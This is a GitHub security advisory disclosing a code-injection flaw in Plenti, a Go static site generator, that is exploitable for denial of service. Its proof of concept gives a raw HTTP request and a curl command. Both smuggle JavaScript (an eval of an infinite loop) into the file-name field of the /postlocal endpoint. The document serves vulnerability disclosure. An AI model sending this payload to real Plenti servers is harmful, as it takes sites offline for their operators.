# [M] Plenti  - Code Injection - Denial of Services

## Summary
Severity: Medium
Advisory: GHSA-mj4v-hp69-27x5
CVE: CVE-2025-26260
CWE: CWE-94
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2025-02-05
Source: https://github.com/advisories/GHSA-mj4v-hp69-27x5
Type: github-advisory

## Affected
- Go: `github.com/plentico/plenti` — affected >=0 <0.7.17

## Details
### Summary
While pushing a file via postLocal method if user add javascript code in file parameter that codes can exe in v8go context.

### Details
While posting a file via postLocal, any attacker will add javascript codes to file parameter. That parameter content pass to componentSignature method after some validation. After that componentSignature parameter concat with ssrStr parameter.

<img width="1145" alt="image" src="https://github.com/user-attachments/assets/a08a3fe5-2fbd-4a05-b93c-2ad127e6ee81" />

Last part of compileSvelte function ssrStr parameter executed in v8go engine.

<img width="754" alt="image" src="https://github.com/user-attachments/assets/4e622761-3324-48d6-8264-6dd6e09055af" />

This cause to any one who can post a file also can push javascript code and run it. Thanks to v8go we can't use all javascript metod, if there is no any vulnerability in v8go we can't escape sandbox and can't run dangerous command like opening socket etc. But we can create infinite loop and the plenti can't response any request.

After posting a file with name 'layouts/global/test; eval(`while(1);`);var test.svelte' we can see the ssrStr parameter include our javascript codes.

<img width="1023" alt="image" src="https://github.com/user-attachments/assets/369c7820-ff8a-4b9a-9cd3-6b0692f1dcf3" />

**Note**: Eval usage not must I just want to ensure that it's run javascript commands.

### PoC
**Request**
```
POST /postlocal HTTP/1.1
Host: localhost:3000
Content-Length: 125
Content-Type: application/json; charset=utf-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

[{"action":"create","encoding":"text","file":"layouts/global/test; eval(`while(1);`);var test.svelte","contents":"anethole"}]
```
**Video**
![PoC](https://github.com/user-attachments/assets/2aca36a1-6989-4be8-a8d1-3b12960f3e9b)

**Curl Request**
```
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: localhost:3000' -H $'Content-Length: 125' -H $'Content-Type: application/json; charset=utf-8' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    --data-binary $'[{\"action\":\"create\",\"encoding\":\"text\",\"file\":\"layouts/global/test; eval(`while(1);`);var test.svelte\",\"contents\":\"anethole\"}]' \
    $'http://localhost:3000/postlocal'
```

### Impact
It's a remote code execution vulnerability. Because of the sandbox we can show only Denial of Service impact. Any vulnerability will be exists in v8go that cause to escape sandbox, different impacts can be show.

**Note:** Plenti is using V8GO and V8GO is using V8 version of 11.1.278. This version released at 25 January 2023. After this date some RCE vulnerabilities founded in V8 like [CVE-2024-5830](https://github.com/advisories/GHSA-fchp-8m28-g68f),

## References
- https://github.com/plentico/plenti/security/advisories/GHSA-mj4v-hp69-27x5
- https://nvd.nist.gov/vuln/detail/CVE-2025-26260
- https://github.com/plentico/plenti/commit/c3e72a9ebbc2a03f4b0f3104becbfc25e390cb8e
- https://ahmetakan.com/2025/02/14/cve-2025-26260
- https://github.com/ahmetak4n/vulnerability-playground/tree/main/vulnerability-research/CVE-2025-26260
- https://github.com/plentico/plenti
- https://github.com/plentico/plenti/releases/tag/v0.7.17
- https://pkg.go.dev/vuln/GO-2025-3454
- https://pkg.go.dev/vuln/GO-2025-3515
